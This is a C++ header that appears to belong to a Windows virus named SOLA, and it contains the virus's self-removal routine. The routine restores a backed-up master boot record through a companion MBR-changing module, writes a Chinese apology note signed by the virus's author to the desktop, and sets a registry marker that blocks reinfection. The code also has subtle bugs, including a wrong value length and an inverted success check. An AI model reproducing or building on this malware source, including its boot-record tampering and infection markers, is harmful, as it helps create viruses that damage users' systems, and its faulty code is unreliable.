#ifndef THISKILL_H
#define THISKILL_H

#include <windows.h>
#include "changembr.h"
#include <fstream>
#include <windows.h>

using namespace std;

ofstream o;
byte backup[512];

string getuserpath()
{
	char var[]="USERPROFILE"; 
	char userpath[2048];
	GetEnvironmentVariable((LPCSTR)var,(LPSTR)userpath,2048);
	return (string)userpath;
}

bool changereg()
{
	HKEY hkey;
	string path="SOFTWARE",data="true",name="disable";
	if(RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)path.c_str(),0,KEY_ALL_ACCESS,&hkey)==ERROR_SUCCESS)
		if(RegCreateKey(HKEY_CURRENT_USER,(LPCTSTR)(path+"\\Sola").c_str(),&hkey)==ERROR_SUCCESS)
			if(RegSetValueEx(hkey,(LPCTSTR)name.c_str(),0,REG_SZ,(const byte*)data.c_str(),sizeof((const byte*)data.c_str())+1)) return true;
	RegCloseKey(hkey);
	return false;				
}

void killthis(HWND hwnd)
{
	if(hwnd) ShowWindow(hwnd,SW_HIDE);
	RecovMBR(backup);//recovery the mbr
	o.open(getuserpath()+"\\Desktop\\Sola自毁的遗书.txt");
	o << "各位电脑爱好者们："<<endl<<"您好。首先，让我对此病毒给您带来的不便向您道歉。"<<endl<<endl<<"SOLA已经从您的计算机中清除。"<<endl<<"您的计算机已经有了SOLA"<<endl<<"的标记，因此不会重复感染。"<<endl<<endl<<"在硬盘中还留有被SOLA病毒"<<endl<<"感染的文件，尽管不会重复感染，"<<endl<<"但建议您清除它们。"<<endl<<endl<<"系统中已经安装了SOLA的专杀程序，"<<endl<<"它可以帮助您扫描并清除带毒文件。"<<endl<<endl<<"祝您好运。"<<endl<<endl<<"SOLA的制造者"<<endl<<"Bob";
	o.flush();
	o.close();
	changereg();
	system("explorer.exe");
}
#endif
